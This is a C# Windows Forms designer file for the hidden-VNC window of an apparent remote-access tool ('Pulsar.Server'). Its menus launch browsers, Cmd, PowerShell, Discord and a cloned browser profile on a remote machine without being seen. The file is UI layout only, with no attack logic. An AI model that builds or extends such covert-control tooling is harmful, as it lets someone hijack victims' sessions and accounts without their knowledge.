using Pulsar.Server.Controls;

namespace Pulsar.Server.Forms
{
    partial class FrmHVNC
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            components = new System.ComponentModel.Container();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(FrmHVNC));
            btnStart = new System.Windows.Forms.Button();
            btnStop = new System.Windows.Forms.Button();
            barQuality = new System.Windows.Forms.TrackBar();
            lblQuality = new System.Windows.Forms.Label();
            lblQualityShow = new System.Windows.Forms.Label();
            btnMouse = new System.Windows.Forms.Button();
            panelTop = new System.Windows.Forms.Panel();
            btnBiDirectionalClipboard = new System.Windows.Forms.Button();
            dropDownMenuButton = new MenuButton();
            contextMenuStrip = new System.Windows.Forms.ContextMenuStrip(components);
            menuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            menuItem2 = new System.Windows.Forms.ToolStripMenuItem();
            startEdgeToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            startBraveToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            startOperaToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            startOperaGXToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            startFirefoxToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            startCmdToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            startPowershellToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            startDiscordToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            startCustomPathToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            cLONEBROWSERPROFILEToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            sizeLabelCounter = new System.Windows.Forms.Label();
            btnKeyboard = new System.Windows.Forms.Button();
            cbMonitors = new System.Windows.Forms.ComboBox();
            btnHide = new System.Windows.Forms.Button();
            btnShow = new System.Windows.Forms.Button();
            toolTipButtons = new System.Windows.Forms.ToolTip(components);
            picDesktop = new RemoteDesktopElementHost();
            ((System.ComponentModel.ISupportInitialize)barQuality).BeginInit();
            panelTop.SuspendLayout();
            contextMenuStrip.SuspendLayout();
            SuspendLayout();
            // 
            // btnStart
            // 
            btnStart.Location = new System.Drawing.Point(11, 3);
            btnStart.Name = "btnStart";
            btnStart.Size = new System.Drawing.Size(68, 28);
            btnStart.TabIndex = 1;
            btnStart.TabStop = false;
            btnStart.Text = "Start";
            btnStart.UseVisualStyleBackColor = true;
            btnStart.Click += btnStart_Click;
            // 
            // btnStop
            // 
            btnStop.Enabled = false;
            btnStop.Location = new System.Drawing.Point(85, 3);
            btnStop.Name = "btnStop";
            btnStop.Size = new System.Drawing.Size(68, 28);
            btnStop.TabIndex = 2;
            btnStop.TabStop = false;
            btnStop.Text = "Stop";
            btnStop.UseVisualStyleBackColor = true;
            btnStop.Click += btnStop_Click;
            // 
            // barQuality
            // 
            barQuality.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
            barQuality.Location = new System.Drawing.Point(456, 3);
            barQuality.Maximum = 100;
            barQuality.Minimum = 1;
            barQuality.Name = "barQuality";
            barQuality.Size = new System.Drawing.Size(114, 45);
            barQuality.TabIndex = 3;
            barQuality.TabStop = false;
            barQuality.Value = 100;
            barQuality.Scroll += barQuality_Scroll;
            // 
            // lblQuality
            // 
            lblQuality.AutoSize = true;
            lblQuality.Location = new System.Drawing.Point(404, 5);
            lblQuality.Name = "lblQuality";
            lblQuality.Size = new System.Drawing.Size(46, 13);
            lblQuality.TabIndex = 4;
            lblQuality.Text = "Quality:";
            // 
            // lblQualityShow
            // 
            lblQualityShow.AutoSize = true;
            lblQualityShow.Location = new System.Drawing.Point(404, 18);
            lblQualityShow.Name = "lblQualityShow";
            lblQualityShow.Size = new System.Drawing.Size(56, 13);
            lblQualityShow.TabIndex = 5;
            lblQualityShow.Text = "100 (best)";
            // 
            // btnMouse
            // 
            btnMouse.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
            btnMouse.Image = Properties.Resources.mouse_delete;
            btnMouse.Location = new System.Drawing.Point(701, 3);
            btnMouse.Name = "btnMouse";
            btnMouse.Size = new System.Drawing.Size(28, 28);
            btnMouse.TabIndex = 6;
            btnMouse.TabStop = false;
            toolTipButtons.SetToolTip(btnMouse, "Enable mouse input.");
            btnMouse.UseVisualStyleBackColor = true;
            btnMouse.Click += btnMouse_Click;
            // 
            // panelTop
            // 
            panelTop.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            panelTop.Controls.Add(btnBiDirectionalClipboard);
            panelTop.Controls.Add(dropDownMenuButton);
            panelTop.Controls.Add(sizeLabelCounter);
            panelTop.Controls.Add(btnKeyboard);
            panelTop.Controls.Add(cbMonitors);
            panelTop.Controls.Add(btnHide);
            panelTop.Controls.Add(lblQualityShow);
            panelTop.Controls.Add(btnMouse);
            panelTop.Controls.Add(btnStart);
            panelTop.Controls.Add(btnStop);
            panelTop.Controls.Add(lblQuality);
            panelTop.Controls.Add(barQuality);
            panelTop.Dock = System.Windows.Forms.DockStyle.Top;
            panelTop.Location = new System.Drawing.Point(0, 0);
            panelTop.Name = "panelTop";
            panelTop.Size = new System.Drawing.Size(859, 36);
            panelTop.TabIndex = 7;
            // 
            // btnBiDirectionalClipboard
            // 
            btnBiDirectionalClipboard.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
            btnBiDirectionalClipboard.Image = Properties.Resources.clipboard_paste_image;
            btnBiDirectionalClipboard.Location = new System.Drawing.Point(667, 3);
            btnBiDirectionalClipboard.Name = "btnBiDirectionalClipboard";
            btnBiDirectionalClipboard.Size = new System.Drawing.Size(28, 28);
            btnBiDirectionalClipboard.TabIndex = 13;
            btnBiDirectionalClipboard.TabStop = false;
            toolTipButtons.SetToolTip(btnBiDirectionalClipboard, "Enable mouse input.");
            btnBiDirectionalClipboard.UseVisualStyleBackColor = true;
            btnBiDirectionalClipboard.Click += btnBiDirectionalClipboard_Click;
            // 
            // dropDownMenuButton
            // 
            dropDownMenuButton.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
            dropDownMenuButton.Location = new System.Drawing.Point(576, 3);
            dropDownMenuButton.Menu = contextMenuStrip;
            dropDownMenuButton.Name = "dropDownMenuButton";
            dropDownMenuButton.Size = new System.Drawing.Size(82, 28);
            dropDownMenuButton.TabIndex = 12;
            dropDownMenuButton.Text = "Menu";
            dropDownMenuButton.UseVisualStyleBackColor = true;
            // 
            // contextMenuStrip
            // 
            contextMenuStrip.BackColor = System.Drawing.Color.FromArgb(40, 40, 40);
            contextMenuStrip.BackgroundImageLayout = System.Windows.Forms.ImageLayout.None;
            contextMenuStrip.Items.AddRange(new System.Windows.Forms.ToolStripItem[] { menuItem1, menuItem2, startEdgeToolStripMenuItem, startBraveToolStripMenuItem, startOperaToolStripMenuItem, startOperaGXToolStripMenuItem, startFirefoxToolStripMenuItem, startCmdToolStripMenuItem, startPowershellToolStripMenuItem, startDiscordToolStripMenuItem, startCustomPathToolStripMenuItem, cLONEBROWSERPROFILEToolStripMenuItem });
            contextMenuStrip.Name = "contextMenuStrip";
            contextMenuStrip.RenderMode = System.Windows.Forms.ToolStripRenderMode.System;
            contextMenuStrip.Size = new System.Drawing.Size(206, 268);
            // 
            // menuItem1
            // 
            menuItem1.ForeColor = System.Drawing.SystemColors.Control;
            menuItem1.Name = "menuItem1";
            menuItem1.Size = new System.Drawing.Size(205, 22);
            menuItem1.Text = "Start Explorer";
            menuItem1.Click += menuItem1_Click;
            // 
            // menuItem2
            // 
            menuItem2.ForeColor = System.Drawing.SystemColors.Control;
            menuItem2.Name = "menuItem2";
            menuItem2.Size = new System.Drawing.Size(205, 22);
            menuItem2.Text = "Start Chrome";
            menuItem2.Click += menuItem2_Click;
            // 
            // startEdgeToolStripMenuItem
            // 
            startEdgeToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control;
            startEdgeToolStripMenuItem.Name = "startEdgeToolStripMenuItem";
            startEdgeToolStripMenuItem.Size = new System.Drawing.Size(205, 22);
            startEdgeToolStripMenuItem.Text = "Start Edge";
            startEdgeToolStripMenuItem.Click += startEdgeToolStripMenuItem_Click;
            // 
            // startBraveToolStripMenuItem
            // 
            startBraveToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control;
            startBraveToolStripMenuItem.Name = "startBraveToolStripMenuItem";
            startBraveToolStripMenuItem.Size = new System.Drawing.Size(205, 22);
            startBraveToolStripMenuItem.Text = "Start Brave";
            startBraveToolStripMenuItem.Click += startBraveToolStripMenuItem_Click;
            // 
            // startOperaToolStripMenuItem
            // 
            startOperaToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control;
            startOperaToolStripMenuItem.Name = "startOperaToolStripMenuItem";
            startOperaToolStripMenuItem.Size = new System.Drawing.Size(205, 22);
            startOperaToolStripMenuItem.Text = "Start Opera";
            startOperaToolStripMenuItem.Click += startOperaToolStripMenuItem_Click;
            // 
            // startOperaGXToolStripMenuItem
            // 
            startOperaGXToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control;
            startOperaGXToolStripMenuItem.Name = "startOperaGXToolStripMenuItem";
            startOperaGXToolStripMenuItem.Size = new System.Drawing.Size(205, 22);
            startOperaGXToolStripMenuItem.Text = "Start OperaGX";
            startOperaGXToolStripMenuItem.Click += startOperaGXToolStripMenuItem_Click;
            // 
            // startFirefoxToolStripMenuItem
            // 
            startFirefoxToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control;
            startFirefoxToolStripMenuItem.Name = "startFirefoxToolStripMenuItem";
            startFirefoxToolStripMenuItem.Size = new System.Drawing.Size(205, 22);
            startFirefoxToolStripMenuItem.Text = "Start Firefox";
            startFirefoxToolStripMenuItem.Click += startFirefoxToolStripMenuItem_Click;
            // 
            // startCmdToolStripMenuItem
            // 
            startCmdToolStripMenuItem.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text;
            startCmdToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control;
            startCmdToolStripMenuItem.Name = "startCmdToolStripMenuItem";
            startCmdToolStripMenuItem.Size = new System.Drawing.Size(205, 22);
            startCmdToolStripMenuItem.Text = "Start Cmd";
            startCmdToolStripMenuItem.Click += startCmdToolStripMenuItem_Click;
            // 
            // startPowershellToolStripMenuItem
            // 
            startPowershellToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control;
            startPowershellToolStripMenuItem.Name = "startPowershellToolStripMenuItem";
            startPowershellToolStripMenuItem.Size = new System.Drawing.Size(205, 22);
            startPowershellToolStripMenuItem.Text = "Start Powershell";
            startPowershellToolStripMenuItem.Click += startPowershellToolStripMenuItem_Click;
            // 
            // startDiscordToolStripMenuItem
            // 
            startDiscordToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control;
            startDiscordToolStripMenuItem.Name = "startDiscordToolStripMenuItem";
            startDiscordToolStripMenuItem.Size = new System.Drawing.Size(205, 22);
            startDiscordToolStripMenuItem.Text = "Start Discord";
            startDiscordToolStripMenuItem.Click += startDiscordToolStripMenuItem_Click;
            // 
            // startCustomPathToolStripMenuItem
            // 
            startCustomPathToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control;
            startCustomPathToolStripMenuItem.Name = "startCustomPathToolStripMenuItem";
            startCustomPathToolStripMenuItem.Size = new System.Drawing.Size(205, 22);
            startCustomPathToolStripMenuItem.Text = "Start Custom Path";
            startCustomPathToolStripMenuItem.Click += startCustomPathToolStripMenuItem_Click;
            // 
            // cLONEBROWSERPROFILEToolStripMenuItem
            // 
            cLONEBROWSERPROFILEToolStripMenuItem.ForeColor = System.Drawing.SystemColors.Control;
            cLONEBROWSERPROFILEToolStripMenuItem.Name = "cLONEBROWSERPROFILEToolStripMenuItem";
            cLONEBROWSERPROFILEToolStripMenuItem.Size = new System.Drawing.Size(205, 22);
            cLONEBROWSERPROFILEToolStripMenuItem.Text = "DIRECT START BROWSER";
            cLONEBROWSERPROFILEToolStripMenuItem.Click += cLONEBROWSERPROFILEToolStripMenuItem_Click;
            // 
            // sizeLabelCounter
            // 
            sizeLabelCounter.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
            sizeLabelCounter.Location = new System.Drawing.Point(769, 11);
            sizeLabelCounter.Name = "sizeLabelCounter";
            sizeLabelCounter.Size = new System.Drawing.Size(77, 15);
            sizeLabelCounter.TabIndex = 11;
            sizeLabelCounter.Text = "Size: ";
            // 
            // btnKeyboard
            // 
            btnKeyboard.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
            btnKeyboard.Image = Properties.Resources.keyboard_delete;
            btnKeyboard.Location = new System.Drawing.Point(735, 3);
            btnKeyboard.Name = "btnKeyboard";
            btnKeyboard.Size = new System.Drawing.Size(28, 28);
            btnKeyboard.TabIndex = 9;
            btnKeyboard.TabStop = false;
            toolTipButtons.SetToolTip(btnKeyboard, "Enable keyboard input.");
            btnKeyboard.UseVisualStyleBackColor = true;
            btnKeyboard.Click += btnKeyboard_Click;
            // 
            // cbMonitors
            // 
            cbMonitors.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
            cbMonitors.FormattingEnabled = true;
            cbMonitors.Items.AddRange(new object[] { "Display 0" });
            cbMonitors.Location = new System.Drawing.Point(159, 5);
            cbMonitors.Name = "cbMonitors";
            cbMonitors.Size = new System.Drawing.Size(180, 21);
            cbMonitors.TabIndex = 8;
            cbMonitors.TabStop = false;
            // 
            // btnHide
            // 
            btnHide.Location = new System.Drawing.Point(344, 3);
            btnHide.Name = "btnHide";
            btnHide.Size = new System.Drawing.Size(54, 28);
            btnHide.TabIndex = 7;
            btnHide.TabStop = false;
            btnHide.Text = "Hide";
            btnHide.UseVisualStyleBackColor = true;
            btnHide.Click += btnHide_Click;
            // 
            // btnShow
            // 
            btnShow.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
            btnShow.Location = new System.Drawing.Point(805, 534);
            btnShow.Name = "btnShow";
            btnShow.Size = new System.Drawing.Size(54, 28);
            btnShow.TabIndex = 8;
            btnShow.TabStop = false;
            btnShow.Text = "Show";
            btnShow.UseVisualStyleBackColor = true;
            btnShow.Visible = false;
            btnShow.Click += btnShow_Click;
            // 
            // picDesktop
            // 
            picDesktop.BackColor = System.Drawing.Color.Black;
            picDesktop.Dock = System.Windows.Forms.DockStyle.Fill;
            picDesktop.Location = new System.Drawing.Point(0, 0);
            picDesktop.Margin = new System.Windows.Forms.Padding(0);
            picDesktop.Name = "picDesktop";
            picDesktop.Size = new System.Drawing.Size(859, 562);
            picDesktop.TabIndex = 0;
            picDesktop.TabStop = false;
            // 
            // FrmHVNC
            // 
            AutoScaleDimensions = new System.Drawing.SizeF(96F, 96F);
            AutoScaleMode = System.Windows.Forms.AutoScaleMode.Dpi;
            ClientSize = new System.Drawing.Size(859, 562);
            Controls.Add(btnShow);
            Controls.Add(panelTop);
            Controls.Add(picDesktop);
            Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
            KeyPreview = true;
            MinimumSize = new System.Drawing.Size(640, 480);
            Name = "FrmHVNC";
            StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            Text = "HVNC []";
            FormClosing += FrmHVNC_FormClosing;
            Load += FrmHVNC_Load;
            Resize += FrmHVNC_Resize;
            ((System.ComponentModel.ISupportInitialize)barQuality).EndInit();
            panelTop.ResumeLayout(false);
            panelTop.PerformLayout();
            contextMenuStrip.ResumeLayout(false);
            ResumeLayout(false);
        }

        #endregion

        private System.Windows.Forms.Button btnStart;
        private System.Windows.Forms.Button btnStop;
        private System.Windows.Forms.TrackBar barQuality;
        private System.Windows.Forms.Label lblQuality;
        private System.Windows.Forms.Label lblQualityShow;
        private System.Windows.Forms.Button btnMouse;
        private System.Windows.Forms.Panel panelTop;
        private System.Windows.Forms.Button btnHide;
        private System.Windows.Forms.Button btnShow;
        private System.Windows.Forms.ComboBox cbMonitors;
        private System.Windows.Forms.Button btnKeyboard;
        private System.Windows.Forms.ToolTip toolTipButtons;
        private Controls.RemoteDesktopElementHost picDesktop;
        private System.Windows.Forms.Label sizeLabelCounter;
        private Controls.MenuButton dropDownMenuButton;
        private System.Windows.Forms.ContextMenuStrip contextMenuStrip;
        private System.Windows.Forms.ToolStripMenuItem menuItem1;
        private System.Windows.Forms.ToolStripMenuItem menuItem2;
        private System.Windows.Forms.ToolStripMenuItem startEdgeToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem startBraveToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem startOperaToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem startFirefoxToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem startCmdToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem startPowershellToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem startCustomPathToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem startDiscordToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem startOperaGXToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem cLONEBROWSERPROFILEToolStripMenuItem;
        private System.Windows.Forms.Button btnBiDirectionalClipboard;
    }
}